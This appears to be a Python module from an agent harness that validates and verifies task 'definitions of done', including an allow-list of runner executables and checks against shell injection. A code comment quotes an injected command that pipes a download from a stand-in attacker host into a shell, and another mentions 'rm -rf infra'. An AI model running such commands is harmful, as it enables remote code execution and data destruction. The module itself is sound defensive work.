"""Definitions of done: validation, mandatory bars, and verification.

A task is not done because an agent says so. It is done when each mandatory
criterion has been independently proven, with evidence recorded against it. This
module is what makes that claim enforceable:

* :func:`validate_criteria` rejects criteria that cannot be checked at all,
  including the ones that pass by running nothing.
* :func:`apply_quality_bars` adds the tests / negative-test / security /
  liveness / code-quality criteria policy requires, where the task admits them.
* :func:`verify_criterion` proves a single criterion, either by running the
  check here or by handing it to the host to run.

## The split this module keeps, in seven words

NVIDIA's NOOA documentation puts it better than this codebase had: **types
validate values; Python validates the world.** A schema can enforce that a line
number is positive or that a status is one of three strings. It cannot prove
that a cited file exists, that a test ran, that a row was written or that an API
accepted a change.

Both halves live here and are deliberately not the same thing.
:func:`validate_criteria` is the first kind: it reads a criterion's own text and
refuses the ones that cannot be checked at all, which is a judgement about the
*statement*. :func:`verify_criterion` is the second: it runs the check and reads
what actually happened, which is a judgement about the *world*. A criterion that
passes the first and fails the second is the ordinary case, and a criterion that
passed the first and was never put through the second is why "verified with no
evidence is recorded as failed" exists.

The exported trajectory (`core/trajectory.py`) carries the same distinction
outward: a criterion the harness proved itself is marked as costing nothing,
while an agent's account of proving one is marked as a model's claim.
"""

from __future__ import annotations

import json
import os
import re
import shlex
import shutil
import signal
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path, PurePosixPath

from ..config import Policy
from ..ids import now_iso
from ..models import (
    CriterionStatus,
    DoDCriterion,
    ExecutionTask,
    Severity,
    VerifyMethod,
)
from .baseline import git_baseline

# Statements that assert a feeling rather than a fact. A criterion phrased this
# way cannot fail, which means it cannot verify anything either.
_VAGUE = re.compile(
    r"\b(works?\s+(well|correctly|properly|as\s+expected)|good|better|improved?|"
    r"clean|nice|robust|proper(ly)?|appropriate(ly)?|reasonable|adequate|"
    r"sufficient(ly)?|high[- ]quality|best\s+practice)\b",
    re.IGNORECASE,
)

_CODE_HINT = re.compile(
    r"\.(py|js|ts|tsx|jsx|go|rs|rb|java|kt|cs|c|cc|cpp|h|hpp|php|swift|scala|sh)\b"
    r"|\b(function|class|module|endpoint|api|handler|service|test|refactor|implement)\b",
    re.IGNORECASE,
)


# What it takes for a proposed criterion to already cover one of the mandatory
# bars, and so for that bar not to be added.
#
# Each alternative has to match a phrase that *is* the check, never one that
# merely names its subject: "the output format is JSON" is about the data the
# code emits, "the seed test data loads" is about a fixture, and "the security
# cameras record" is about a domain. None of them proves anything about
# formatting, about the suite, or about untrusted input, yet each of them
# removed a mandatory bar while the bar was matched on a bare word. Anchoring
# was only half the fix -- it stopped `auth` matching inside `author`, but
# `format`, `test` and `security` are whole words in their own right.
#
# Every pattern below matches a subset of what its bare word list matched, so
# the narrowing can only restore a bar that used to be suppressed; it can never
# suppress one that used to be added.
_COVERS_TESTS = re.compile(
    r"""
      \b(go|cargo|npm|yarn|pnpm|dotnet|mvn|gradle|make)\s+tests?\b
    | \bcoverage\b
    | \b(unit|integration|regression|smoke|e2e|end-to-end|automated|failing)[\s-]tests?\b
    | \btests?\s+(pass\w*|cover\w*|exercise\w*|exist\w*|fail\w*)\b
    | \b(test|spec)s?\s+(suite|case|cases|file|files)\b
    | \b(suite|specs?)\s+pass\w*\b
    """,
    re.VERBOSE,
)

_COVERS_SECURITY = re.compile(
    r"""
      \b(injection|authn|authz|authentic|authoris|authoriz|secret
        |validat|sanitis|sanitiz)\w*\b
    | \bsecurity\s+(review|audit|check|checks|scan\w*|weakness\w*|issues?|risks?
        |control|controls|implications?|boundary|hardening|posture|tests?)\b
    | \b(review|audit|assess|check|scan)\w*\s+for\s+security\b
    """,
    re.VERBOSE,
)

_COVERS_CODE_QUALITY = re.compile(
    r"""
      \blint\w*\b
    | \bformatt(ing|er|ers|ed)\b
    | \b(code|coding)\s+(style|quality)\b
    | \bstyle\s?guide\b
    | \bstyle\s+(convention|rule)s?\b
    | \bquality\s+(gate|bar|check|checks)\b
    """,
    re.VERBOSE,
)


# A task whose whole point is that something must *not* happen: a fence that
# must hold, a guard that must refuse. Both tasks that failed in a real run
# failed on a shape nobody had tested -- ``rm -rf infra`` against a scope fence,
# a ``PermissionError`` against a lock -- because every criterion they carried
# was satisfiable by the implementer's own happy-path tests. A guard is only
# proven by the case it exists to reject.
_GUARD_TASK = re.compile(
    r"""
      \b(fence|fences|fencing|sandbox\w*|confine\w*|quarantine\w*)\b
    | \b(allow|deny|block)[\s-]?lists?\b
    | \b(traversal|injection|escap(e|es|ing)|spoof\w*|forg(e|ed|ery)|tamper\w*)\b
    | \b(untrusted|hostile|malicious|attacker|adversar\w*)\b
    | \b(privilege|privileges|permission|permissions|authoris\w*|authoriz\w*)\b
    | \baccess\s+control\b
    | \b(lock|locks|locking|mutex|semaphore|latch)\b
    | \b(retry|retries|retrying|backoff|throttl\w*|rate[\s-]limit\w*|quota|quotas)\b
    | \b(timeout|timeouts|deadline|deadlines)\b
    | \bresource\s+(guard|guards|limit|limits|exhaustion|leak|leaks)\b
    | \bout[\s-]of[\s-]scope\b
    """,
    re.VERBOSE | re.IGNORECASE,
)

# What makes a criterion a *negative* test: it names an outcome the change must
# refuse, and it names the shape concretely enough to write down. "Rejects
# unsafe input" is neither; "raises PermissionError when the lock file is
# read-only" is both.
_REFUSAL = re.compile(
    r"""
      \b(reject\w*|refus\w*|den(y|ies|ied)|block\w*|forbid\w*|abort\w*)\b
    | \b(raises?|raised|throws?|thrown)\b
    | \bfails?\s+closed\b
    | \b(must|does|do|can|cannot|will)\s+not\b
    | \bnon-?zero\s+exit\b
    | \bexits?\s+[1-9]\d*\b
    | \bleaves?\s+\w+\s+untouched\b
    """,
    re.VERBOSE | re.IGNORECASE,
)

_CONCRETE_SHAPE = re.compile(
    r"""
      '[^']+'                     # a quoted literal: the input, path or command
    | "[^"]+"
    | `[^`]+`
    | \b\w+(Error|Exception)\b    # a named exception
    | \b[45]\d\d\b                # an HTTP status
    | \.\./                       # a traversal shape
    | \b\w[\w.-]*/[\w./*-]+       # a path or glob
    | \brm\s+-[a-zA-Z]+\b         # a destructive command written out
    | \bE[A-Z]{3,}\b              # an errno name
    | \bSIG[A-Z]+\b               # a signal
    """,
    re.VERBOSE,
)

# Changes whose failure mode is not a wrong answer but no answer at all. The
# standing security bar asks whether a change is safe, never whether it
# terminates: a fix that replaced a crash with an unbounded hot spin satisfied
# every criterion it carried.
_LIVENESS_TASK = re.compile(
    r"""
      \b(lock|locks|locking|unlock\w*|mutex|semaphore|latch|barrier)\b
    | \b(deadlock\w*|livelock\w*|starvation|contention|contended)\b
    | \b(retry|retries|retrying|backoff|poll|polls|polling|spin\w*)\b
    | \b(timeout|timeouts|deadline|deadlines|wait|waits|waiting|blocking)\b
    | \b(thread|threads|threading|concurren\w*|parallelis\w*|race\s+condition)\b
    | \b(async|await|asyncio|coroutine\w*|event\s+loop)\b
    | \b(subprocess|socket|sockets|connection|connections|stream|streaming)\b
    | \bI/O\b
    | \b(queue|queues|backpressure)\b
    """,
    re.VERBOSE | re.IGNORECASE,
)

_COVERS_LIVENESS = re.compile(
    r"""
      \b(hang|hangs|hanging|deadlock\w*|livelock\w*|spin\w*|busy[\s-]wait\w*)\b
    | \bwithout\s+bound\b
    | \bbounded[\s-]time\b
    | \b(terminates?|completes?|returns?|finishes?)\s+(with)?in\s+\d
    | \bwithin\s+\d+\s*(ms|secs?|seconds?|minutes?)\b
    | \bwall[\s-]clock\b
    """,
    re.VERBOSE | re.IGNORECASE,
)


# Tasks whose tests should pass both before and after, so a test that "fails
# without the change" is the wrong demand: moving, renaming or splitting code,
# documentation, and making the same behaviour faster. Matched on the task's
# title and action. A miss in this direction adds a criterion the task cannot
# meet, which fails it visibly; the opposite miss would leave a behaviour change
# with nothing showing its tests detect it.
_NO_BEHAVIOUR_CHANGE = re.compile(
    r"""
      \b(refactor\w*|renam\w*|reorganis\w*|reorganiz\w*|restructur\w*)\b
    | \b(extract|extracts|extracting|inline|inlines|inlining)\b
    | \b(split|splits|splitting)\s+(the\s+)?\w*\s*(module|file|class|function)
    | \b(move|moves|moving)\b.*\b(into|to)\b.*\b(module|file|package|directory)\b
    | \b(tidy|tidies|tidying|clean[\s-]?up)\b
    | \bno\s+(functional\s+|behaviou?ral\s+)?(behaviou?r\s+)?changes?\b
    | \bwithout\s+changing\s+(its\s+|the\s+)?behaviou?r\b
    | \b(docs?|documentation|docstrings?|typos?|readme)\b
    | \b(optimi[sz]\w*|performance|speed\s+up|faster)\b
    """,
    re.VERBOSE | re.IGNORECASE,
)

FAILS_BEFORE_STATEMENT = (
    "The tests this task adds or changes fail on the baseline commit, then pass "
    "with the change"
)

# What a verifier agent is told to do when the harness could not run the check
# itself. Written as a procedure, because the harness's own version is one.
FAILS_BEFORE_RUBRIC = (
    "If the harness has not already settled this: create a worktree at the "
    "baseline commit named under Baseline (git worktree add --detach <dir> "
    "<commit>), copy in the test files this task added or changed, and run those "
    "test modules there and then in the working tree. Pass only if at least one "
    "test that passes in the working tree fails or cannot be collected at the "
    "baseline, and every one of them passes in the working tree. Quote both runs. "
    "Remove the worktree afterwards."
)


def wants_fails_before(task: ExecutionTask) -> bool:
    """Whether this task changes behaviour, so its tests should not pass without it."""
    return not _NO_BEHAVIOUR_CHANGE.search(f"{task.title} {task.action}")


# Flags that run a *subset* of a suite. A filter that selects nothing is not an
# error to most runners: ``go test -run ZzzNone ./...`` exits 0 with "[no tests
# to run]", cargo and vitest do the same, and pytest exits 5 only when every
# test in the run was deselected -- ``pytest -k "locking or modif"`` exits 0
# with the ``modif`` half matching nothing at all. In a real run a criterion
# filtered on ``-k modif`` was selecting zero tests the day it was written, and
# only a verifier that counted the selection noticed.
_SELECTION_FLAGS = frozenset({
    "-k", "-m", "-run", "--run", "-t", "--testNamePattern", "--test-name-pattern",
    "--filter", "--gtest_filter", "--grep", "--example",
})

# Short selection flags whose value may be attached (``-kmodif``).
_ATTACHABLE_FLAGS = ("-k", "-m", "-t")

# A pytest/unittest node id, and an anchored name pattern: the two ways a
# command can say exactly which tests it means instead of describing them.
_NODE_ID = re.compile(r"[\w./\-]+\.\w+::[\w\[\].-]+")
_ANCHORED_NAME = re.compile(r"\^[A-Za-z_]\w*\$")

# An expectation that pins how many tests ran, e.g. "7 passed" or "3 selected".
# Read as a minimum: the substring match that proves it also matches a larger
# count, which errs towards accepting a suite that has since grown.
_SELECTION_COUNT = re.compile(
    r"\b\d+\s*(?:tests?\s+)?(?:passed|selected|ran\b|ok\b)", re.IGNORECASE
)

# Operators that make a filter expression select for more than one reason, so a
# count cannot say which half of it matched.
_FILTER_BOOLEAN = re.compile(r"\b(or|and)\b", re.IGNORECASE)

# What a runner prints when its filter matched nothing.
_RAN_NOTHING = re.compile(
    r"""
      no\s+tests?\s+(to\s+run|ran|were\s+run|found|matched)
    | collected\s+0\s+items
    | running\s+0\s+tests
    | \b0\s+(?:tests?\s+)?(?:passed|selected|ok)\b
    | tests?:\s+0\s+total
    """,
    re.VERBOSE | re.IGNORECASE,
)


# Executables a criterion's command may name. A definition of done proves
# something by running the project's own checks, so this list is deliberately
# small: the command string is copied verbatim out of a model's JSON by
# ``parse_dod``, which makes it untrusted input, and anything outside the list
# is a request to run arbitrary code with the harness's own permissions.
#
# It is an allow-list of runners, not a proof of containment: several entries
# run whatever the project hands them (``npm test``, ``make``), and ``python``
# and ``node`` will run source given on the command line. ``tools.py`` reuses
# this list to fence a scoped agent's shell and refuses those inline-source
# flags on top; a criterion command is not scoped at all, and is bounded only by
# the user approving the task it belongs to.
VERIFY_EXECUTABLES = frozenset({
    "python", "python3", "py", "pytest", "tox", "coverage", "mypy", "ruff",
    "flake8", "pylint", "black", "isort", "bandit",
    "npm", "npx", "pnpm", "yarn", "node", "jest", "vitest", "eslint", "tsc",
    "go", "cargo", "rustc", "dotnet", "mvn", "gradle", "make", "cmake", "ctest",
    "rake", "rspec", "bundle", "phpunit", "swift",
    # A project's own verification script, as `npm run` and `make` run a
    # project's own targets -- and held to a script file (`powershell_refusal`).
    "pwsh", "powershell",
})

# Characters that hand the rest of a command to a shell. They only matter
# unquoted: ``python -c "print(1); raise SystemExit(1)"`` is a single argument,
# while ``pytest -q; curl attacker.sh | sh`` is three commands.
_METACHARACTERS = ";&|<>`$\n\r"


@dataclass
class CriterionIssue:
    criterion_id: str
    problem: str
    severity: Severity = Severity.MEDIUM


# --------------------------------------------------------------------------
# Validation
# --------------------------------------------------------------------------


def _statement_key(statement: str) -> str:
    """A criterion's statement, normalised for comparison."""
    return " ".join(statement.lower().split())


def selection_filter(command: str) -> str | None:
    """The test-selection filter this command applies, or ``None``.

    Returned as ``flag value``, so a caller can quote it back to whoever wrote
    it. ``python -m pytest`` is not a filter: that ``-m`` names the module to
    run, and reading it as a marker expression would flag every criterion that
    invokes pytest the portable way.
    """
    tokens = shell_split(command)
    if not tokens:
        return None

    start = 1
    if executable_name(tokens[0]) in {"python", "python3", "py"}:
        for index in range(1, len(tokens)):
            if tokens[index] == "-m":
                start = index + 2
                break
            if not tokens[index].startswith("-"):
                break

    for index in range(start, len(tokens)):
        flag, separator, attached = tokens[index].partition("=")
        if flag in _SELECTION_FLAGS:
            value = attached if separator else (
                tokens[index + 1] if index + 1 < len(tokens) else ""
            )
            return f"{flag} {value}".strip()
        if len(flag) > 2 and not flag.startswith("--") and flag[:2] in _ATTACHABLE_FLAGS:
            return f"{flag[:2]} {flag[2:]}"
    return None


def unpinned_selection(criterion: DoDCriterion) -> str | None:
    """Why this criterion can pass having run nothing, or ``None`` if it cannot.

    A filter describes the tests a criterion means, and a description goes
    stale: rename the test, or write the filter against a test that never
    existed, and the command still exits 0 -- the criterion now certifies the
    absence of the tests it was written to demand. Naming node ids, or stating
    how many tests must be selected, turns that description back into an
    assertion.
    """
    selection = selection_filter(criterion.command)
    if selection is None:
        return None
    if _NODE_ID.search(criterion.command) or _ANCHORED_NAME.search(criterion.command):
        return None

    expression = selection.partition(" ")[2]
    if _FILTER_BOOLEAN.search(expression):
        return (
            f"the selection {selection!r} can match for more than one reason, so a "
            "count cannot say which half of it matched and a dead term stays "
            "invisible; name the test node ids this criterion means, as "
            "path/to/test_file.py::test_name"
        )
    if _SELECTION_COUNT.search(criterion.expect):
        return None
    return (
        f"the command runs a subset chosen by {selection!r}, and nothing says what "
        "that subset is: a filter that matches no test at all still passes. Name "
        "the test node ids, as path/to/test_file.py::test_name, or set expect to "
        "the minimum selection, as '7 passed'"
    )


def has_negative_test(task: ExecutionTask) -> bool:
    """Whether some criterion already drives a concrete refusal.

    Both halves have to be in the same criterion. A definition of done that
    says "rejects unsafe input" in one place and quotes a path in another has
    still not said what to write.
    """
    for criterion in task.dod:
        text = (
            f"{criterion.statement} {criterion.command} "
            f"{criterion.expect} {criterion.rubric}"
        )
        if _REFUSAL.search(text) and _CONCRETE_SHAPE.search(text):
            return True
    return False


def _shape_hint(task: ExecutionTask) -> str:
    """The task's own words for the failure it exists to prevent."""
    source = task.motivation.strip() or task.action.strip() or task.title.strip()
    return " ".join(source.split())[:240]


def validate_criteria(criteria: list[DoDCriterion], policy: Policy) -> list[CriterionIssue]:
    """Report everything that makes this definition of done unenforceable."""
    issues: list[CriterionIssue] = []
    mandatory = [c for c in criteria if c.mandatory]

    if len(criteria) < policy.min_dod_criteria:
        issues.append(
            CriterionIssue(
                "-",
                f"only {len(criteria)} criteria; policy requires at least "
                f"{policy.min_dod_criteria}",
                Severity.HIGH,
            )
        )
    if not mandatory:
        issues.append(CriterionIssue("-", "no mandatory criteria: nothing can fail", Severity.HIGH))
    if mandatory and not any(c.machine_checkable for c in mandatory):
        issues.append(
            CriterionIssue(
                "-",
                "every mandatory criterion is a subjective review; at least one must be "
                "checkable by command, test or inspection",
                Severity.HIGH,
            )
        )

    for crit in criteria:
        statement = crit.statement.strip()
        if not statement:
            issues.append(CriterionIssue(crit.id, "empty statement", Severity.HIGH))
            continue
        if _VAGUE.search(statement) and crit.method is not VerifyMethod.REVIEW:
            issues.append(
                CriterionIssue(
                    crit.id,
                    f"unfalsifiable wording ({statement[:60]!r}); state the observable outcome",
                    Severity.MEDIUM,
                )
            )
        if " and " in statement.lower() and crit.method is not VerifyMethod.REVIEW:
            issues.append(
                CriterionIssue(
                    crit.id,
                    "compound statement: split it so each half can pass or fail alone",
                    Severity.LOW,
                )
            )
        if crit.method is VerifyMethod.FAILS_BEFORE and not crit.command.strip():
            issues.append(
                CriterionIssue(crit.id, "method=fails_before but no test command given",
                               Severity.HIGH)
            )
        if crit.method in (VerifyMethod.COMMAND, VerifyMethod.TEST):
            if not crit.command.strip():
                issues.append(
                    CriterionIssue(crit.id, f"method={crit.method.value} but no command given",
                                   Severity.HIGH)
                )
            else:
                unpinned = unpinned_selection(crit)
                if unpinned is not None:
                    issues.append(CriterionIssue(crit.id, unpinned, Severity.HIGH))
        if crit.method is VerifyMethod.REVIEW and not crit.rubric.strip():
            issues.append(
                CriterionIssue(crit.id, "review criterion has no rubric to judge against",
                               Severity.MEDIUM)
            )
        if crit.method is VerifyMethod.INSPECTION and not inspectable(crit.expect):
            # HIGH, because the harness cannot check it at all: in a go-live
            # run every inspection criterion of six tasks came with no
            # `expect`, passed as a medium warning, and was BLOCKED at
            # verification three times over -- no task could be verified.
            issues.append(
                CriterionIssue(crit.id, "inspection criterion does not say what proves it: "
                               f"its expect must read {INSPECTION_FORM!r}", Severity.HIGH)
            )
    return issues


def pytest_argv(command: str) -> list[str] | None:
    """``command`` tokenised, if it invokes pytest; otherwise ``None``."""
    tokens = shell_split(command)
    if not tokens:
        return None
    name = executable_name(tokens[0])
    if name == "pytest":
        return tokens
    if name in ("python", "python3", "py") and tokens[1:3] == ["-m", "pytest"]:
        return tokens
    return None


def touches_code(task: ExecutionTask) -> bool:
    """Whether the quality bars meaningfully apply to this task."""
    haystack = " ".join([task.title, task.action, *task.scope.paths])
    return bool(_CODE_HINT.search(haystack))


def detect_test_command(workspace: Path) -> str:
    """Best guess at how this project runs its tests.

    A test criterion with no command cannot be proven mechanically, so it decays
    into a model's opinion about whether tests pass -- which is exactly the kind
    of unverified assurance the harness exists to prevent. Guessing the runner
    from the project's own files keeps the criterion checkable.
    """
    if not workspace.is_dir():
        return ""

    # The project's own marker files first, at the root, in the order a
    # project declares itself. Searching the whole tree for `test_*.py` came
    # first once, and it is wrong twice over in a real repository: a
    # TypeScript app with a Python sub-project was given `pytest` at its root,
    # and the search walked every `node_modules` and virtualenv to decide it.
    if any((workspace / marker).is_file() for marker in _PYTHON_MARKERS):
        return _pytest_command(workspace)

    package = workspace / "package.json"
    if package.is_file():
        try:
            scripts = json.loads(package.read_text(encoding="utf-8")).get("scripts", {})
        except (json.JSONDecodeError, OSError):
            scripts = {}
        if "test" in scripts:
            return "npm test --silent"
    if (workspace / "go.mod").is_file():
        return "go test ./..."
    if (workspace / "Cargo.toml").is_file():
        return "cargo test"
    # Last, a Python project with no marker file at all, known only by its tests.
    tests = workspace / "tests"
    if (tests.is_dir() and any(tests.glob("test_*.py"))) or any(workspace.glob("test_*.py")):
        return _pytest_command(workspace)
    return ""


#: Files at a repository's root that say it is a Python project.
_PYTHON_MARKERS = ("pyproject.toml", "pytest.ini", "setup.cfg", "tox.ini", "setup.py")


def _pytest_command(workspace: Path) -> str:
    """pytest as the project runs it: from its own virtualenv when it has one.

    The `pytest` on PATH belongs to whichever Python is first there, which for
    most projects is not the one their dependencies are installed in -- so a
    suite that passes in the project's environment fails at import in the
    harness's. Absolute, so it resolves from any working directory, including
    a run's own worktree, which has no virtualenv of its own.
    """
    for name in (".venv", "venv"):
        for bindir, python, pytest in (("Scripts", "python.exe", "pytest.exe"),
                                       ("bin", "python", "pytest")):
            interpreter = workspace / name / bindir / python
            if interpreter.is_file() and (workspace / name / bindir / pytest).is_file():
                return f'"{interpreter}" -m pytest -q'
    return "pytest -q"


#: A criterion about the whole suite still passing, as opposed to one test.
#: "The new component test passes" is not one of these: the suite passing
#: proves nothing about a test that was never written.
_WHOLE_SUITE = re.compile(
    r"""
      \b(existing|all|other|remaining|whole|full|entire)\b[\w\s-]{0,24}?\btests?\b
        [\w\s]{0,16}?\bpass
    | \bno\s+new\s+(test\s+)?failures?\b
    | \bno\s+regressions?\b
    | \b(test\s+)?suite\b[\w\s]{0,12}?\bpass
    """,
    re.VERBOSE | re.IGNORECASE,
)


def fill_suite_commands(task: ExecutionTask, workspace: Path | None) -> list[str]:
    """Give a whole-suite criterion that names no command the project's own.

    Measured on a local model: each task's definition of done carried "existing
    unit tests still pass" as a `command` criterion with no command, even after
    being sent back once naming it -- and under envelope approval seven of
    eight tasks went to the owner for it. Which command runs the whole suite is
    not a judgement the model has to make: it is the one the harness's own test
    bar runs. The model's expectation was written for a command it never named,
    so the suite's own verdict, its exit code, replaces it.

    Returns a line per criterion filled, for the task's notes.
    """
    lines: list[str] = []
    for crit in task.dod:
        if crit.method not in (VerifyMethod.COMMAND, VerifyMethod.TEST) or crit.command.strip():
            continue
        named = command_named_in(crit.statement)
        if named:
            crit.command, crit.expect = named, _exit_code_or_zero(crit.expect)
            lines.append(f"criterion {crit.statement!r} named its command in its statement; "
                         f"it runs `{named}`")
    if workspace is None:
        return lines
    candidates = [
        c for c in task.dod
        if c.method in (VerifyMethod.COMMAND, VerifyMethod.TEST)
        and not c.command.strip() and _WHOLE_SUITE.search(c.statement)
    ]
    command = detect_test_command(workspace) if candidates else ""
    if not command:
        return lines
    for crit in candidates:
        crit.command, crit.expect = command, "0"
    return lines + [f"criterion {c.statement!r} named no command; it runs the project's "
                    f"test suite, `{command}`" for c in candidates]


def review_what_cannot_run(task: ExecutionTask, policy: Policy) -> list[str]:
    """A behaviour claim with no command, judged by the verifier instead of escalated.

    The last resort, after the synthesis has been sent back once and a command
    named in the sentence or a whole-suite claim has been filled in. Measured
    on a local model: "Reporting.ledger() output contains 'conc' when the phase
    has dispatches" as a `command` criterion with no command, kept through the
    send-back -- three of four tasks of a run went to the owner for it, and
    under envelope approval nothing more happened to them. A person reading it
    would say what it is: a statement about the code and its tests, to be
    judged. So it becomes a mandatory `review`, judged by the independent
    verifier with the statement as its rubric -- only where the harness's own
    test bar is on the task, so tests that run, and that fail without the
    change, still stand behind it.
    """
    if not policy.require_tests:
        return []
    lines: list[str] = []
    for crit in task.dod:
        if crit.method in (VerifyMethod.COMMAND, VerifyMethod.TEST) and not crit.command.strip():
            crit.method = VerifyMethod.REVIEW
            crit.rubric = (f"Pass only if the code and its tests show this: {crit.statement}. "
                           "Cite the test that proves it, by file and line, and the code it "
                           "exercises. A claim with no test behind it fails.")
            crit.expect = ""
            lines.append(f"criterion {crit.statement!r} named no command it could be run by; "
                         "the verifier judges it against the code and its tests")
    return lines


#: The one shape of `expect` an inspection criterion can be checked by.
INSPECTION_FORM = "path/to/file: text that must be present"


def inspectable(expect: str) -> bool:
    """Whether ``expect`` names a file, and optionally text, the harness can look for."""
    path, colon, _ = expect.strip().partition(":")
    return bool(colon and path.strip())


def review_what_cannot_inspect(task: ExecutionTask) -> list[str]:
    """A file-state claim with no file to look in, judged by the verifier instead.

    The last resort, after the synthesis has been sent back once for it. Left
    as it was, `verify_inspection` blocks it on every attempt and the task can
    never be verified; "ResultsSection.tsx stores the DataError, not a boolean"
    is a statement about the code a reader can judge. So it becomes a mandatory
    `review` with the statement as its rubric, and the verifier must cite the
    lines.
    """
    lines: list[str] = []
    for crit in task.dod:
        if crit.method is VerifyMethod.INSPECTION and not inspectable(crit.expect):
            crit.method = VerifyMethod.REVIEW
            crit.rubric = (f"Pass only if the code shows this: {crit.statement}. Cite the "
                           "file and line that show it. A claim you cannot point to fails.")
            crit.expect = ""
            lines.append(f"criterion {crit.statement!r} named no file and text to look for; "
                         "the verifier judges it against the code")
    return lines


#: A check runner's command at the start of a statement, or anywhere in
#: backticks: "npm run typecheck passes after the change", "`pytest -q tests/x.py`
#: exits 0". Only runners the harness would run anyway; the result still goes
#: through `unsafe_command`.
_NAMED_COMMAND = re.compile(
    r"`((?:npm|npx|pnpm|yarn|pytest|python -m pytest|go test|cargo test|make)\b[^`]*)`"
    r"|^((?:npm|npx|pnpm|yarn|pytest|python -m pytest|go test|cargo test|make)\b.*?)"
    r"(?=\s+(?:passes|pass|succeeds|exits|completes|runs|returns|is green|still)\b"
    r"|\s*[(,;:]|$)",
    re.IGNORECASE,
)


def command_named_in(statement: str) -> str:
    """The command a criterion's statement names, when it names exactly one.

    Measured on a local model: "npm run typecheck passes with the new
    data-layer types", "npx playwright test tests/e2e/offline.spec.ts passes"
    -- `command` criteria with the command in the sentence and the field
    empty, and five of six tasks sent to the owner for it. The sentence said
    what to run.
    """
    # A sentence that chains commands is not read as naming one: taking the
    # first link alone would quietly check less than the sentence says.
    if any(op in statement for op in (";", "&&", "||", "|")):
        return ""
    match = _NAMED_COMMAND.search(statement.strip())
    if match is None:
        return ""
    command = (match.group(1) or match.group(2) or "").strip()
    return command if command and unsafe_command(command) is None else ""


def _exit_code_or_zero(expect: str) -> str:
    """Keep an expectation that is an exit code; otherwise the command's own verdict.

    The model's expectation was written without the command in front of it --
    "at least 1 passed" read as a substring would fail a suite that printed
    "3 passed" -- so only an exit code survives.
    """
    exit_code = re.fullmatch(r"(?:exit\s*(?:code)?\s*[= ]\s*)?(\d+)", expect.strip(),
                             re.IGNORECASE)
    return exit_code.group(1) if exit_code else "0"


def apply_quality_bars(
    task: ExecutionTask, policy: Policy, workspace: Path | None = None
) -> list[DoDCriterion]:
    """Add the mandatory bars policy requires, where the task admits them.

    Returns only the criteria that were added, so the caller can tell the user
    what the harness inserted on their behalf.
    """
    if not touches_code(task):
        return []

    existing = " ".join(c.statement.lower() + " " + c.command.lower() for c in task.dod)
    # A test criterion with no command covers nothing: it cannot be run. Let it
    # stand in for the test bar and a run measured on a local model got the
    # worst of both -- the harness's runnable bar left off, and the task sent
    # to the owner for the criterion that displaced it.
    runnable = " ".join(
        c.statement.lower() + " " + c.command.lower() for c in task.dod
        if c.command.strip() or c.method not in (VerifyMethod.COMMAND, VerifyMethod.TEST)
    )
    subject = f"{task.title} {task.action} {task.motivation}"
    present = {_statement_key(c.statement) for c in task.dod}
    added: list[DoDCriterion] = []

    def bar(covered: bool, criterion: DoDCriterion) -> None:
        """Add a mandatory bar unless it is covered, or already on the task.

        A bar is skipped only when the proposed criteria already cover it, which
        takes a phrase that means the check itself -- see the _COVERS_ patterns
        above. A bar a criterion can suppress by naming the task's subject
        matter is not a mandatory bar at all.

        The second test is against the harness's own wording rather than the
        model's: ``_apply_modifications`` re-runs this gate over a replaced
        definition of done, so a bar the replacement kept verbatim must not be
        added beside itself.
        """
        if covered or _statement_key(criterion.statement) in present:
            return
        present.add(_statement_key(criterion.statement))
        added.append(criterion)

    if policy.require_tests:
        bar(
            bool(_COVERS_TESTS.search(runnable)),
            DoDCriterion(
                statement=(
                    "Automated tests cover the behaviour changed by this task, including "
                    "at least one failure or edge case, and the suite passes"
                ),
                method=VerifyMethod.TEST,
                command=detect_test_command(workspace) if workspace else "",
                expect="0",
                mandatory=True,
            ),
        )

    # A test that passes without the change does not test it. Proven by the
    # harness running the task's tests on the baseline commit, which needs a
    # git baseline to run them on and a runner whose per-test results it can
    # read -- so only where both exist, and only for a change in behaviour.
    # And only where the harness may run commands: handed to a verifier agent
    # instead, it would be a model's account of the check again, which is the
    # thing it exists to replace, at the cost of a worktree procedure per task.
    if (policy.require_tests and policy.require_fails_before
            and policy.allow_command_execution and workspace is not None):
        command = detect_test_command(workspace)
        if (pytest_argv(command) is not None and wants_fails_before(task)
                and git_baseline(workspace)):
            bar(
                any(c.method is VerifyMethod.FAILS_BEFORE for c in task.dod),
                DoDCriterion(
                    statement=FAILS_BEFORE_STATEMENT,
                    method=VerifyMethod.FAILS_BEFORE,
                    command=command,
                    rubric=FAILS_BEFORE_RUBRIC,
                    mandatory=True,
                ),
            )

    # A guard is proven by the case it rejects, and by nothing else. Both tasks
    # that failed in a real run met every criterion they carried and then fell
    # over on the first shape nobody had written down.
    if policy.require_negative_test and _GUARD_TASK.search(subject):
        bar(
            has_negative_test(task),
            DoDCriterion(
                statement=(
                    "A test drives the concrete failure shape this task exists to "
                    "prevent, and asserts the change refuses it"
                ),
                method=VerifyMethod.REVIEW,
                rubric=(
                    "Name the test and quote the input it drives. Pass only if that "
                    "input is the attack or failure shape this task was motivated by "
                    f"-- {_shape_hint(task)} -- written out concretely: the traversal "
                    "path, the destructive command, the exception the caller must see. "
                    "A test that exercises only the permitted path, or that asserts on "
                    "a log line rather than on the refusal, does not pass this "
                    "criterion."
                ),
                mandatory=True,
            ),
        )

    if policy.require_security_review:
        bar(
            bool(_COVERS_SECURITY.search(existing)),
            DoDCriterion(
                statement=(
                    "The change introduces no new untrusted-input, secret-handling or "
                    "authorisation weakness"
                ),
                method=VerifyMethod.REVIEW,
                rubric=(
                    "Trace each new or modified input path to its use. Pass only if "
                    "untrusted input is validated before use, secrets are neither logged "
                    "nor returned, and authorisation checks fail closed."
                ),
                mandatory=True,
            ),
        )

    # Safety is not liveness. A change that cannot be tricked can still stop
    # answering: the crash this kind of task is usually written to fix was once
    # replaced by an unbounded hot spin, which every criterion on it accepted.
    if policy.require_liveness_review and _LIVENESS_TASK.search(subject):
        bar(
            bool(_COVERS_LIVENESS.search(existing)),
            DoDCriterion(
                statement=(
                    "No wait, retry or lock this change adds can hang, deadlock or "
                    "spin without bound"
                ),
                method=VerifyMethod.REVIEW,
                rubric=(
                    "Follow every wait, retry and lock acquisition the change adds or "
                    "modifies. Pass only on a bounded-time demonstration: a named test "
                    "that drives the contended or failing path to completion inside a "
                    "stated wall-clock bound, with the measured time quoted. Reading "
                    "the code is not a demonstration. Fail if a retry loop has neither "
                    "a delay nor an attempt ceiling, if a lock is taken without a "
                    "timeout, or if a failure path returns to the same wait with "
